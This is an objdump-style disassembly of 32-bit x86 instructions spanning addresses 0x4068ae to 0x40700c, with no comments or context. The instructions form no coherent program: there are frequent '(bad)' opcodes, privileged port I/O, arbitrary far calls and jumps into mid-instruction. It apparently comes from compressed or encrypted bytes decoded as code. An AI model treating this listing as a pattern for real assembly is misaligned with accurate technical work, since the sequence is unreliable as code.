  4068ae:	sub    BYTE PTR [ebx-0x2aa9c044],bl
  4068b4:	mov    BYTE PTR [ebp+0x4f118bcb],dl
  4068ba:	jno    0x406849
  4068bc:	mov    dh,0xfd
  4068be:	mov    ecx,0x421c4de3
  4068c3:	xor    al,0x1e
  4068c5:	mov    bh,0x3
  4068c7:	inc    esp
  4068c8:	dec    eax
  4068c9:	xchg   esp,eax
  4068ca:	push   ds
  4068cb:	mov    edx,0x8e142735
  4068d0:	jge    0x40692f
  4068d2:	in     eax,dx
  4068d3:	dec    ebp
  4068d4:	neg    DWORD PTR [edi+ecx*8]
  4068d7:	mov    ecx,0x8d8202e1
  4068dc:	aad    0xe9
  4068de:	jecxz  0x406951
  4068e0:	sbb    DWORD PTR [edx+0x461237],ebx
  4068e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068e7:	loopne 0x406891
  4068e9:	pop    ecx
  4068ea:	or     BYTE PTR [eax+0x4f],0xe4
  4068ee:	push   ds
  4068ef:	sub    bl,dl
  4068f1:	retf   
  4068f2:	push   edi
  4068f3:	sub    DWORD PTR [edi+0x2b],edx
  4068f6:	jae    0x4068c0
  4068f8:	int    0x8d
  4068fa:	test   BYTE PTR [eax-0x26d7f277],dl
  406900:	test   BYTE PTR [edi-0x70],bl
  406903:	and    dh,BYTE PTR [edx+0x46]
  406906:	jmp    0x406970
  406908:	icebp  
  406909:	ss pop edi
  40690b:	jg     0x40690a
  40690d:	jae    0x40697c
  40690f:	and    eax,0x396384a1
  406914:	jns    0x4068e0
  406916:	and    DWORD PTR [ecx-0x23],ecx
  406919:	mov    esi,0xb6417dc4
  40691e:	or     dl,BYTE PTR [edi]
  406920:	stos   BYTE PTR es:[edi],al
  406921:	push   0x2a
  406923:	add    al,0x9b
  406925:	push   edi
  406926:	adc    eax,DWORD PTR [ecx]
  406928:	inc    esi
  406929:	lds    esp,FWORD PTR [edi+esi*1-0x7a62128c]
  406930:	cs mov ah,0xa8
  406933:	clc    
  406934:	or     eax,0x921ba2e5
  406939:	pop    ds
  40693a:	leave  
  40693b:	mov    edi,ecx
  40693d:	ror    ah,1
  40693f:	mov    bl,0x50
  406941:	out    0xf5,eax
  406943:	shl    BYTE PTR [ecx],cl
  406945:	mov    dl,0x54
  406947:	lods   eax,DWORD PTR ds:[esi]
  406948:	int3   
  406949:	test   BYTE PTR [eax+0x60],0xbc
  40694d:	shr    DWORD PTR [ecx],0x83
  406950:	lods   al,BYTE PTR ds:[esi]
  406951:	retf   0x1c1e
  406954:	jle    0x4068f4
  406956:	pop    ecx
  406957:	xor    al,0x3b
  406959:	mov    ds,ecx
  40695b:	nop
  40695c:	shl    BYTE PTR [eax],1
  40695e:	mov    al,0xf1
  406960:	mov    edx,edi
  406962:	pop    ds
  406963:	popf   
  406964:	data16 fild QWORD PTR [edi]
  406967:	sub    BYTE PTR [edx+0x53],al
  40696a:	adc    dl,al
  40696c:	and    al,0x23
  40696e:	xor    bl,BYTE PTR [ebx+0x6ff8ec8f]
  406974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406975:	lods   al,BYTE PTR ds:[esi]
  406976:	loope  0x40692f
  406978:	jp     0x4069be
  40697a:	or     ebp,DWORD PTR [esi]
  40697c:	hlt    
  40697d:	repz pop edi
  40697f:	data16 stos BYTE PTR es:[edi],al
  406981:	mov    edi,0xdf7365e7
  406986:	fild   QWORD PTR [eax+0x5b005e47]
  40698c:	mov    WORD PTR [edi-0x65],fs
  40698f:	dec    edi
  406990:	xor    al,BYTE PTR [edi+0x6a]
  406993:	aaa    
  406994:	mov    esi,0xbfea415
  406999:	sub    eax,0xf69dc8d6
  40699e:	pusha  
  40699f:	adc    ebp,DWORD PTR [esi+0x70]
  4069a2:	add    ah,dh
  4069a4:	jge    0x40693c
  4069a6:	adc    eax,0x4cb15ff5
  4069ab:	push   ds
  4069ac:	test   eax,0x6692b15d
  4069b1:	add    al,0xa2
  4069b3:	stos   BYTE PTR es:[edi],al
  4069b4:	mov    WORD PTR [ebx-0x6f],?
  4069b7:	neg    DWORD PTR [ecx+0x37]
  4069ba:	dec    ebx
  4069bb:	jmp    0x40693d
  4069bd:	add    al,0xe2
  4069bf:	stos   BYTE PTR es:[edi],al
  4069c0:	sbb    DWORD PTR [ecx+0x390ab847],edi
  4069c6:	mov    ds:0x39887e7e,al
  4069cb:	mov    ah,0x3
  4069cd:	rcr    BYTE PTR [edx+0x4d],0xba
  4069d1:	inc    ecx
  4069d2:	ret    
  4069d3:	push   ss
  4069d4:	cmp    eax,0xb67b0321
  4069d9:	cmp    DWORD PTR [ecx-0x21],eax
  4069dc:	and    BYTE PTR [edi-0x63],ah
  4069df:	push   ebx
  4069e0:	dec    eax
  4069e1:	call   0x9fa0:0x2224ec46
  4069e8:	inc    ecx
  4069e9:	ja     0x40696f
  4069eb:	sbb    DWORD PTR [ebx],eax
  4069ed:	cwde   
  4069ee:	dec    esi
  4069ef:	fstp   DWORD PTR [esi]
  4069f1:	pop    esp
  4069f2:	cdq    
  4069f3:	lods   eax,DWORD PTR ds:[esi]
  4069f4:	inc    edx
  4069f5:	dec    ebp
  4069f6:	or     DWORD PTR [esi-0x23bdbd42],0x19
  4069fd:	add    esi,ecx
  4069ff:	rcr    DWORD PTR [edx+esi*1+0x5b],cl
  406a03:	mov    bl,0x6a
  406a05:	dec    esp
  406a06:	call   DWORD PTR [eax-0x2a]
  406a09:	jl     0x4069eb
  406a0b:	lock mov ebx,DWORD PTR [edi]
  406a0e:	fdiv   st,st(5)
  406a10:	push   edi
  406a11:	push   ebx
  406a12:	xor    esp,0xffffff92
  406a15:	and    eax,0xcf5ce029
  406a1a:	mov    dh,0x6e
  406a1c:	lea    ecx,[ebp+0x65]
  406a1f:	test   DWORD PTR [ebp-0x7c68e232],0x7fe8c1ff
  406a29:	inc    ecx
  406a2a:	mov    es,WORD PTR [ebx-0x28254431]
  406a30:	jo     0x4069cd
  406a32:	icebp  
  406a33:	cdq    
  406a34:	mov    dl,0x4a
  406a36:	sub    eax,0xb6b6fd
  406a3b:	jp     0x4069f1
  406a3d:	xor    al,0xd8
  406a3f:	sbb    BYTE PTR [eax],dl
  406a41:	xchg   esi,eax
  406a42:	sub    ebx,DWORD PTR [edx+0x45]
  406a45:	xchg   edx,eax
  406a46:	mov    ebx,0xfaf41a04
  406a4b:	ss sbb al,0x1a
  406a4e:	dec    ebp
  406a4f:	imul   esi,DWORD PTR [edi],0xfea7b8bc
  406a55:	and    al,0xb
  406a57:	loopne 0x4069ea
  406a59:	sar    eax,1
  406a5b:	mov    ecx,ebp
  406a5d:	jg     0x406a6c
  406a5f:	sub    dl,BYTE PTR ds:0x8a153dc0
  406a65:	sbb    al,dh
  406a67:	test   BYTE PTR [ebp+0x7],bh
  406a6a:	(bad)  
  406a6b:	das    
  406a6c:	pop    ebx
  406a6d:	push   ecx
  406a6e:	lods   eax,DWORD PTR ds:[esi]
  406a6f:	popf   
  406a70:	aas    
  406a71:	or     ch,ah
  406a73:	loope  0x406ae6
  406a75:	mov    edx,0xaf82511d
  406a7a:	sub    BYTE PTR [ebx-0x4959343],dl
  406a80:	fst    DWORD PTR [ebx-0x7d80acb3]
  406a86:	pop    es
  406a87:	sbb    DWORD PTR [ebp+0x27],esi
  406a8a:	push   ss
  406a8b:	cdq    
  406a8c:	(bad)
  406a8f:	bound  di,DWORD PTR [ebp-0x476c5694]
  406a96:	add    al,0xc
  406a98:	jns    0x406abd
  406a9a:	ja     0x406b13
  406a9c:	mov    ch,0xe9
  406a9e:	adc    bh,ch
  406aa0:	push   0xf02a9263
  406aa5:	je     0x406aa9
  406aa7:	cli    
  406aa8:	sbb    al,0xcb
  406aaa:	inc    ebx
  406aab:	pop    ss
  406aac:	adc    BYTE PTR [ecx],cl
  406aae:	jl     0x406a72
  406ab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ab1:	xor    eax,DWORD PTR [ebx]
  406ab3:	mov    ds:0xd4a518b5,eax
  406ab8:	xchg   edi,eax
  406ab9:	ret    0x1c77
  406abc:	outs   dx,DWORD PTR ds:[esi]
  406abd:	mov    cl,0x4
  406abf:	push   edi
  406ac0:	out    0x81,al
  406ac2:	jbe    0x406aec
  406ac4:	outs   dx,DWORD PTR ds:[esi]
  406ac5:	das    
  406ac6:	lock inc eax
  406ac8:	in     eax,dx
  406ac9:	popf   
  406aca:	xchg   ecx,eax
  406acb:	mov    eax,ds:0x40b7880
  406ad0:	or     eax,0x812b2aa
  406ad5:	into   
  406ad6:	stos   BYTE PTR es:[edi],al
  406ad7:	out    0x19,eax
  406ad9:	xchg   edx,eax
  406ada:	sub    bh,ah
  406adc:	xchg   BYTE PTR [edx+edi*2],cl
  406adf:	rcl    ebp,0xe7
  406ae2:	test   DWORD PTR gs:[esi+ebp*8+0x4b],ecx
  406ae7:	loope  0x406ad0
  406ae9:	ffree  st(2)
  406aeb:	fs inc esi
  406aed:	ret    0x6fd3
  406af0:	inc    ecx
  406af1:	jmp    0x406af4
  406af3:	xor    ah,BYTE PTR [eax+0x6b67f4cd]
  406af9:	into   
  406afa:	aad    0xb0
  406afc:	outs   dx,DWORD PTR ds:[esi]
  406afd:	xor    bl,ah
  406aff:	mov    dl,0x1
  406b01:	inc    eax
  406b02:	imul   eax,esp,0x63dde937
  406b08:	cmp    al,dh
  406b0a:	aas    
  406b0b:	sub    bl,bh
  406b0d:	xchg   ecx,eax
  406b0e:	or     ecx,DWORD PTR [ebp-0x4e]
  406b11:	push   esi
  406b12:	cmc    
  406b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b14:	jbe    0x406b57
  406b16:	lea    eax,[edi+esi*1]
  406b19:	jae    0x406b26
  406b1b:	imul   ecx,DWORD PTR [eax-0x3cbda4c7],0xffffff8d
  406b22:	outs   dx,BYTE PTR ds:[esi]
  406b23:	sbb    ebx,DWORD PTR [ecx+0x29]
  406b26:	outs   dx,BYTE PTR ds:[esi]
  406b27:	in     al,0xb3
  406b29:	cmp    BYTE PTR [esi],dl
  406b2b:	stos   DWORD PTR es:[edi],eax
  406b2c:	and    esi,ebp
  406b2e:	sub    dh,BYTE PTR [eax+eax*8-0x80]
  406b32:	out    0xc1,eax
  406b34:	inc    ebp
  406b35:	daa    
  406b36:	rcr    BYTE PTR [esi+0x69588475],0xbe
  406b3d:	fidivr DWORD PTR [edi+0x14a58fc0]
  406b43:	out    0x39,eax
  406b45:	cs (bad) 
  406b47:	push   ds
  406b48:	hlt    
  406b49:	(bad)  
  406b4a:	xor    esi,DWORD PTR [eax+0x76]
  406b4d:	xor    ebx,ebp
  406b4f:	sub    dh,BYTE PTR [esi]
  406b51:	imul   edx,DWORD PTR [ebp+0x41],0x5305966a
  406b58:	cli    
  406b59:	push   edx
  406b5a:	iret   
  406b5b:	(bad)  
  406b5c:	mov    bh,0x6b
  406b5e:	std    
  406b5f:	cmp    DWORD PTR [esi],ecx
  406b61:	push   0xbb7eb493
  406b66:	or     DWORD PTR [edx],edi
  406b68:	pop    edx
  406b69:	ret    
  406b6a:	jbe    0x406afc
  406b6c:	or     BYTE PTR [esi+eax*2+0x440b33ca],dh
  406b73:	in     al,0xed
  406b75:	mov    esi,0x9b872dbd
  406b7a:	mov    WORD PTR [ebp-0x3f],?
  406b7d:	sbb    eax,0xd1e05d26
  406b82:	mov    esp,0x125a50b4
  406b87:	sahf   
  406b88:	test   eax,0x50e287e
  406b8d:	ins    BYTE PTR es:[edi],dx
  406b8e:	cmp    cl,bl
  406b90:	aas    
  406b91:	popf   
  406b92:	fadd   st(3),st
  406b94:	or     bh,cl
  406b96:	cmp    ah,BYTE PTR [esi]
  406b98:	sbb    al,bl
  406b9a:	and    ecx,DWORD PTR [esi+0x39477022]
  406ba0:	sbb    al,0x1e
  406ba2:	inc    ecx
  406ba3:	lahf   
  406ba4:	dec    ebp
  406ba5:	je     0x406bc4
  406ba7:	jbe    0x406be8
  406ba9:	mov    ebp,0x2eddc82e
  406bae:	retf   0x9930
  406bb1:	push   eax
  406bb2:	pop    esp
  406bb3:	fiadd  DWORD PTR [edi+edi*2+0x5eec023c]
  406bba:	jns    0x406bae
  406bbc:	pop    eax
  406bbd:	test   al,0xee
  406bbf:	and    ecx,edi
  406bc1:	pop    ebp
  406bc2:	test   al,0x4b
  406bc4:	or     eax,0x4c1aa882
  406bc9:	call   0x43e8039
  406bce:	cmp    al,0xec
  406bd0:	dec    esi
  406bd1:	add    eax,0x25e5432e
  406bd6:	repnz jmp FWORD PTR [edx-0x2d32c379]
  406bdd:	inc    ebx
  406bde:	adc    ebx,esi
  406be0:	pop    ds
  406be1:	push   ds
  406be2:	push   0x68
  406be4:	arpl   bp,si
  406be6:	repnz dec esp
  406be8:	cmp    DWORD PTR [ebx-0x7ea6532e],esi
  406bee:	stc    
  406bef:	rcr    BYTE PTR es:[edi+0x19],cl
  406bf3:	aad    0xf
  406bf5:	and    eax,0x94df1525
  406bfa:	shl    DWORD PTR [edi],1
  406bfc:	in     al,dx
  406bfd:	call   DWORD PTR [esi]
  406bff:	xchg   DWORD PTR [ebx-0x2825f3da],eax
  406c05:	pop    esi
  406c06:	int    0x8
  406c08:	(bad)  
  406c09:	xor    eax,edx
  406c0b:	add    eax,0xcaa7b31e
  406c10:	adc    ah,BYTE PTR [edx+0x64]
  406c13:	in     eax,0xeb
  406c15:	js     0x406c2e
  406c17:	xchg   esi,eax
  406c18:	jmp    0x69a924e2
  406c1d:	inc    ecx
  406c1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c1f:	cld    
  406c20:	xchg   edx,eax
  406c21:	js     0x406c28
  406c23:	xor    edx,DWORD PTR [edx-0x6c]
  406c26:	iret   
  406c27:	mov    ds:0x5dbb75d4,al
  406c2c:	imul   DWORD PTR [ebx-0x35]
  406c2f:	xor    BYTE PTR [eax],0xa8
  406c32:	sub    BYTE PTR [esi-0x3e],0x3c
  406c36:	stc    
  406c37:	and    esp,DWORD PTR [ebx-0x3505bff8]
  406c3d:	clc    
  406c3e:	adc    al,0x55
  406c40:	cmp    al,0xc2
  406c42:	sbb    DWORD PTR [eax+0x27],edi
  406c45:	push   ss
  406c46:	out    dx,eax
  406c47:	add    esi,DWORD PTR ds:0x671e86fe
  406c4d:	loope  0x406c16
  406c4f:	cld    
  406c50:	jg     0x406c00
  406c52:	or     al,0x91
  406c54:	push   cs
  406c55:	sbb    ah,BYTE PTR [ebx]
  406c57:	add    ah,0x60
  406c5a:	lock test al,0x5d
  406c5e:	and    al,0xc9
  406c60:	pop    es
  406c61:	and    DWORD PTR [edx],ebp
  406c63:	sbb    al,0x8a
  406c65:	out    0x9,al
  406c67:	int3   
  406c68:	fcomp  QWORD PTR [edi-0x13]
  406c6b:	cwde   
  406c6c:	push   esi
  406c6d:	mov    ecx,0xbf8a7a4e
  406c72:	push   ecx
  406c73:	push   0xffffffd2
  406c75:	xchg   edi,eax
  406c76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c77:	int3   
  406c78:	ins    BYTE PTR es:[edi],dx
  406c79:	ja     0x406cfa
  406c7b:	jp     0x406ce3
  406c7d:	xor    DWORD PTR [edx+0x1],ecx
  406c80:	iret   
  406c81:	icebp  
  406c82:	cdq    
  406c83:	sub    al,0x43
  406c85:	fwait
  406c86:	xor    edi,esp
  406c88:	stos   BYTE PTR es:[edi],al
  406c89:	cmp    al,0x9e
  406c8b:	out    dx,eax
  406c8c:	dec    ebx
  406c8d:	stos   BYTE PTR es:[edi],al
  406c8e:	dec    ebp
  406c8f:	pop    DWORD PTR [edi]
  406c91:	push   edi
  406c92:	aad    0xca
  406c94:	stos   BYTE PTR es:[edi],al
  406c95:	or     al,0x84
  406c97:	adc    ecx,DWORD PTR ds:0x3fbf74c5
  406c9d:	cli    
  406c9e:	mul    ebx
  406ca0:	rcl    BYTE PTR ds:0x4c8af0a9,cl
  406ca6:	repz push ss
  406ca8:	sub    ebp,DWORD PTR [ebx]
  406caa:	aad    0xb
  406cac:	dec    ebx
  406cad:	pushf  
  406cae:	mov    BYTE PTR [ebx-0x224ca9cb],dl
  406cb4:	xchg   ebp,eax
  406cb5:	push   ss
  406cb6:	test   BYTE PTR [esi],dh
  406cb8:	push   cs
  406cb9:	call   0x5c06f005
  406cbe:	and    al,0x13
  406cc0:	dec    edx
  406cc1:	leave  
  406cc2:	inc    edx
  406cc3:	in     eax,dx
  406cc4:	hlt    
  406cc5:	je     0x406d3f
  406cc7:	js     0x406d03
  406cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cca:	fs xchg esi,eax
  406ccc:	scas   eax,DWORD PTR es:[edi]
  406ccd:	dec    edi
  406cce:	retf   
  406ccf:	inc    edi
  406cd0:	lds    eax,FWORD PTR [edi]
  406cd2:	les    ebp,FWORD PTR [eax+0x4d40d5dd]
  406cd8:	mov    ds:0x3eb570f2,al
  406cdd:	push   eax
  406cde:	inc    esi
  406cdf:	push   ds
  406ce0:	fcmovnu st,st(4)
  406ce2:	jo     0x406ccb
  406ce4:	outs   dx,DWORD PTR ds:[esi]
  406ce5:	mov    edi,0x69cb2644
  406cea:	cmp    eax,0x418ff2f3
  406cef:	out    0xf6,eax
  406cf1:	mov    dl,0x2e
  406cf3:	jg     0x406d15
  406cf5:	aad    0xe1
  406cf7:	gs hlt 
  406cf9:	sub    al,0x93
  406cfb:	xlat   BYTE PTR ds:[ebx]
  406cfc:	cli    
  406cfd:	xchg   ebx,eax
  406cfe:	push   eax
  406cff:	shl    BYTE PTR [edi-0x19b27a6c],1
  406d05:	ret    0xff
  406d08:	sbb    ch,ch
  406d0a:	mov    esp,0xd85b45d5
  406d0f:	add    ebp,DWORD PTR [edi-0x76]
  406d12:	xchg   DWORD PTR [ebx-0x66],eax
  406d15:	or     ebx,DWORD PTR [eax]
  406d17:	push   edx
  406d18:	ins    DWORD PTR es:[edi],dx
  406d19:	imul   edx,DWORD PTR [eax],0xffffffd4
  406d1c:	jne    0x406d0d
  406d1e:	bound  eax,QWORD PTR [ecx]
  406d20:	xchg   DWORD PTR [ebx],ecx
  406d22:	push   esi
  406d23:	fmul   QWORD PTR [ebx+eiz*4]
  406d26:	call   0x63aa:0xf8bc363
  406d2d:	xlat   BYTE PTR ds:[ebx]
  406d2e:	call   ebp
  406d30:	mov    eax,?
  406d32:	xchg   edx,eax
  406d33:	mov    ebp,0x65e5d82c
  406d38:	lds    ecx,FWORD PTR [ebx]
  406d3a:	jge    0x406cf5
  406d3c:	scas   al,BYTE PTR es:[edi]
  406d3d:	xchg   ecx,eax
  406d3e:	adc    DWORD PTR [edi-0x19],edx
  406d41:	push   cs
  406d42:	dec    esi
  406d43:	aad    0x47
  406d45:	clc    
  406d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d47:	push   ds
  406d48:	repz inc ecx
  406d4a:	dec    edx
  406d4b:	cmp    bl,bl
  406d4d:	mov    edx,0x347801f4
  406d52:	std    
  406d53:	cdq    
  406d54:	mov    ds:0x78b70009,al
  406d59:	imul   al
  406d5b:	scas   eax,DWORD PTR es:[edi]
  406d5c:	pop    ebp
  406d5d:	add    al,0x60
  406d5f:	dec    ecx
  406d60:	pop    eax
  406d61:	div    ecx
  406d63:	hlt    
  406d64:	add    al,0x56
  406d66:	add    DWORD PTR [ebp+0xb38c111],edi
  406d6c:	retf   0x42ec
  406d6f:	xchg   edi,eax
  406d70:	loopne 0x406d06
  406d72:	or     BYTE PTR [edi],bh
  406d74:	adc    ebx,esi
  406d76:	out    dx,eax
  406d77:	jle    0x406d63
  406d79:	outs   dx,DWORD PTR ds:[esi]
  406d7a:	add    ebx,esp
  406d7c:	loop   0x406df0
  406d7e:	pusha  
  406d7f:	stos   BYTE PTR es:[edi],al
  406d80:	add    ebp,DWORD PTR [ebp-0x57]
  406d83:	dec    ebp
  406d84:	and    BYTE PTR [ecx],bl
  406d86:	push   ebx
  406d87:	inc    edi
  406d88:	fadd   st(6),st
  406d8a:	pop    esp
  406d8b:	dec    esp
  406d8c:	retf   0xe49b
  406d8f:	pushf  
  406d90:	cmp    eax,0xeeb26a87
  406d95:	or     cl,BYTE PTR [edi-0x1d]
  406d98:	mov    edi,0x74c64519
  406d9d:	dec    edi
  406d9e:	sub    ax,0xce19
  406da2:	lds    esp,FWORD PTR [ebp-0x2c1e57ee]
  406da8:	cmp    eax,0xbc39e98b
  406dad:	mov    DWORD PTR [ebx-0x63],esp
  406db0:	inc    ebp
  406db1:	(bad)  
  406db2:	push   esi
  406db3:	out    0xae,eax
  406db5:	rcr    DWORD PTR [eax+ebx*1-0x18],cl
  406db9:	out    0x69,al
  406dbb:	(bad)
  406dbf:	into   
  406dc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dc1:	fisttp DWORD PTR [edx+0x7a]
  406dc4:	out    dx,eax
  406dc5:	enter  0x1628,0x73
  406dc9:	and    ebp,DWORD PTR [ebx+0x58037594]
  406dcf:	xor    esi,DWORD PTR [ebx-0x30]
  406dd2:	xor    ch,dh
  406dd4:	and    eax,0xb524d056
  406dd9:	sti    
  406dda:	test   al,0x5c
  406ddc:	mov    dl,0x30
  406dde:	ret    
  406ddf:	pop    ss
  406de0:	xor    edi,ebp
  406de2:	jl     0x406dff
  406de4:	dec    esi
  406de5:	jne    0x406db0
  406de7:	and    dh,BYTE PTR [edx]
  406de9:	fs push ebp
  406deb:	outs   dx,DWORD PTR ds:[esi]
  406dec:	addr16 out 0x31,eax
  406def:	xchg   edx,eax
  406df0:	cli    
  406df1:	(bad)  
  406df2:	leave  
  406df3:	inc    eax
  406df4:	fdivr  QWORD PTR [edi+0x62d050af]
  406dfa:	sub    cl,BYTE PTR [edx+eax*1-0x49]
  406dfe:	fld    QWORD PTR [ebp-0x39]
  406e01:	push   ss
  406e02:	or     bl,cl
  406e04:	and    BYTE PTR ds:0xa91e33f7,0xf0
  406e0b:	add    BYTE PTR [eax-0x30f2ba4c],ah
  406e11:	push   ecx
  406e12:	cmp    ah,BYTE PTR [ecx+0x3a5d8576]
  406e18:	push   ebp
  406e19:	mov    dl,cl
  406e1b:	push   ss
  406e1c:	cmp    ecx,DWORD PTR [esi]
  406e1e:	xchg   ebx,eax
  406e1f:	sti    
  406e20:	mov    DWORD PTR [ecx],ebp
  406e22:	mov    BYTE PTR [ecx-0x33],bh
  406e25:	dec    esp
  406e26:	inc    ecx
  406e27:	inc    eax
  406e28:	rcl    DWORD PTR [ecx+ecx*2-0x76],1
  406e2c:	push   ss
  406e2d:	iret   
  406e2e:	clc    
  406e2f:	clc    
  406e30:	inc    esp
  406e31:	stos   BYTE PTR es:[edi],al
  406e32:	mul    cl
  406e34:	lock xchg DWORD PTR [eax+0x35558ce2],ecx
  406e3b:	jnp    0x406eaa
  406e3d:	dec    eax
  406e3e:	mov    ?,esi
  406e40:	mov    bh,0x4b
  406e42:	sahf   
  406e43:	or     eax,0xf321b517
  406e48:	adc    eax,DWORD PTR [edi+0xf]
  406e4b:	dec    eax
  406e4c:	adc    bl,al
  406e4e:	xchg   edi,eax
  406e4f:	inc    esi
  406e50:	jno    0x406e9f
  406e52:	xlat   BYTE PTR ds:[ebx]
  406e53:	xor    ah,ch
  406e55:	or     al,0xf3
  406e57:	adc    DWORD PTR ds:0xd1cf096e,0x9565b30f
  406e61:	push   eax
  406e62:	pop    esp
  406e63:	or     edi,DWORD PTR [ebp+0x3]
  406e66:	sub    DWORD PTR [edx-0x3fb93423],esi
  406e6c:	shl    dh,0x19
  406e6f:	in     eax,dx
  406e70:	icebp  
  406e71:	jmp    0x45e75519
  406e76:	add    cl,ah
  406e78:	fcmovbe st,st(0)
  406e7a:	into   
  406e7b:	jl     0x406e64
  406e7d:	cmp    cl,ch
  406e7f:	and    edx,esp
  406e81:	push   ds
  406e82:	mov    ebp,0xa5a35ba
  406e87:	imul   bl
  406e89:	(bad)  
  406e8a:	pop    eax
  406e8b:	xor    edx,eax
  406e8d:	loope  0x406e6c
  406e8f:	push   esi
  406e90:	sub    edx,esp
  406e92:	sbb    ecx,DWORD PTR [ebx+0x71eef27]
  406e98:	test   eax,0xd2e6b890
  406e9d:	add    BYTE PTR [edx-0x33],bl
  406ea0:	add    DWORD PTR [esi-0x11cb9614],eax
  406ea6:	outs   dx,DWORD PTR ds:[esi]
  406ea7:	outs   dx,BYTE PTR ds:[esi]
  406ea8:	xchg   BYTE PTR [ecx+0x31],cl
  406eab:	dec    ebx
  406eac:	stc    
  406ead:	jmp    0x2a6b6b9b
  406eb2:	lods   al,BYTE PTR ds:[esi]
  406eb3:	sbb    BYTE PTR [esi-0x293bb1e0],bh
  406eb9:	ins    BYTE PTR es:[edi],dx
  406eba:	fmul   st(3),st
  406ebc:	int3   
  406ebd:	or     ch,BYTE PTR [edi-0x6009098c]
  406ec3:	cmp    al,BYTE PTR [esi+0x744ce229]
  406ec9:	(bad)  
  406eca:	into   
  406ecb:	ss (bad) 
  406ecd:	je     0x406f12
  406ecf:	push   ebx
  406ed0:	adc    al,0x5
  406ed2:	pop    ds
  406ed3:	or     bh,al
  406ed5:	sbb    al,0x11
  406ed7:	push   edi
  406ed8:	(bad)  
  406ed9:	neg    DWORD PTR [ebx-0x60]
  406edc:	dec    edi
  406edd:	ja     0x406ed9
  406edf:	lods   al,BYTE PTR ds:[esi]
  406ee0:	push   cs
  406ee1:	add    BYTE PTR [esi+ecx*8+0x6c54afa0],al
  406ee8:	mov    edx,0xd87b1016
  406eed:	jle    0x406f58
  406eef:	rcl    cl,0x1
  406ef2:	mov    eax,0xfee2a3f9
  406ef7:	test   al,0x56
  406ef9:	inc    edx
  406efa:	das    
  406efb:	fdiv   DWORD PTR [edi-0x3b]
  406efe:	and    dh,BYTE PTR [edi]
  406f00:	les    ebp,FWORD PTR [edx]
  406f02:	cwde   
  406f03:	test   al,0x9
  406f05:	inc    edx
  406f06:	lock hlt 
  406f08:	or     DWORD PTR [ecx+0x4a023fb8],0xeaabb8c
  406f12:	cmp    cl,BYTE PTR [ecx+0x79e544d9]
  406f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f19:	xor    al,0x63
  406f1b:	popf   
  406f1c:	or     DWORD PTR [edi+0x7a87cff0],eax
  406f22:	push   ebx
  406f23:	ror    BYTE PTR [eax+eax*2+0x2f],0xf5
  406f28:	lea    ecx,[esp+edx*1-0x41]
  406f2c:	dec    edx
  406f2d:	in     eax,dx
  406f2e:	sbb    ah,BYTE PTR [edx]
  406f30:	call   0xbc88:0xcc300b7b
  406f37:	(bad)  
  406f38:	mov    ds:0x296dcf51,al
  406f3d:	and    eax,0x72fe923e
  406f42:	retf   0xa5e9
  406f45:	push   ebp
  406f46:	int3   
  406f47:	mov    edi,0x3e5a6109
  406f4c:	lahf   
  406f4d:	retf   
  406f4e:	push   ds
  406f4f:	dec    ecx
  406f50:	ins    DWORD PTR es:[edi],dx
  406f51:	(bad)  
  406f52:	push   cs
  406f53:	mov    eax,0xe44d922f
  406f58:	fidivr DWORD PTR [ecx]
  406f5a:	popa   
  406f5b:	mov    ch,0x4b
  406f5d:	xor    ch,0x69
  406f60:	sbb    DWORD PTR [ebp+edx*2+0x31e4d85e],edi
  406f67:	shrd   ebp,eax,cl
  406f6a:	aaa    
  406f6b:	mov    eax,0x9829768b
  406f70:	dec    ebp
  406f71:	aam    0xcd
  406f73:	sbb    dl,0x90
  406f76:	push   0x31758812
  406f7b:	inc    eax
  406f7c:	hlt    
  406f7d:	xlat   BYTE PTR ds:[ebx]
  406f7e:	nop
  406f7f:	adc    ebp,eax
  406f81:	inc    edi
  406f82:	push   esp
  406f83:	mov    ds:0xe8153c5e,al
  406f88:	mov    ebp,0xd947b44f
  406f8d:	add    DWORD PTR [ebx],esp
  406f8f:	sbb    ecx,ebx
  406f91:	xchg   esp,eax
  406f92:	sub    DWORD PTR [eax-0x21],0x26e5a456
  406f99:	aaa    
  406f9a:	pop    ebp
  406f9b:	or     BYTE PTR [ebx-0x755987da],ch
  406fa1:	dec    esi
  406fa2:	add    bh,BYTE PTR [edi-0x75c1a2c6]
  406fa8:	outs   dx,BYTE PTR ds:[esi]
  406fa9:	jl     0x406fd0
  406fab:	int3   
  406fac:	push   edx
  406fad:	into   
  406fae:	in     eax,dx
  406faf:	push   ecx
  406fb0:	inc    ebp
  406fb1:	es xor eax,0x491aaf8b
  406fb7:	aas    
  406fb8:	adc    eax,0xc2fa96d9
  406fbd:	push   edx
  406fbe:	fucomip st,st(2)
  406fc0:	dec    ecx
  406fc1:	push   ds
  406fc2:	mov    edi,0xb1108310
  406fc7:	adc    BYTE PTR [edx-0x38],bl
  406fca:	mov    edi,0x5e10bab2
  406fcf:	das    
  406fd0:	imul   eax,DWORD PTR [eax],0xbf1eb668
  406fd6:	dec    eax
  406fd7:	loopne 0x40703f
  406fd9:	hlt    
  406fda:	pop    edx
  406fdb:	pop    esi
  406fdc:	pop    edi
  406fdd:	(bad)  
  406fde:	ins    DWORD PTR es:[edi],dx
  406fdf:	ficom  WORD PTR [ecx-0x25]
  406fe2:	xchg   edx,eax
  406fe3:	push   0xffffffdb
  406fe5:	add    DWORD PTR [ecx+0x3a645654],edi
  406feb:	mov    esi,DWORD PTR [eax+eax*8-0x40f6ebb0]
  406ff2:	shl    BYTE PTR [esi+edi*8],cl
  406ff5:	ret    0xd199
  406ff8:	add    al,BYTE PTR [edx+0x10]
  406ffb:	(bad)  
  406ffc:	test   BYTE PTR [bx+di-0x48ea],ah
  407001:	mov    esi,DWORD PTR [ebp-0x61]
  407004:	adc    al,0x2c
  407006:	scas   eax,DWORD PTR es:[edi]
  407007:	bt     esi,esi
  40700a:	mov    es,ebp
  40700c:	mov    edx,DWORD PTR [ebx+ebp*4]
